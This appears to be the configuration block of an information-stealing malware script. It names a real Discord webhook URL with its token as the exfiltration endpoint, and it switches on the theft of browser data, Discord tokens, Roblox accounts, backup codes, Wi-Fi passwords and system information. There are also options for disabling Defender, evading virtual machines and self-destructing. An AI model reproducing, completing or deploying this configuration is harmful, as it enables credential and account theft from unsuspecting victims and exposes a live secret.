...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1173172286111617075/IZWmsbbOM_AmzE55HObZnF_TJHTpglU_drL0Gkkiy2quhv_ZZfr8oHBE1urkbnTvOlfV', 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'defender': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False, 'clipboard': False}
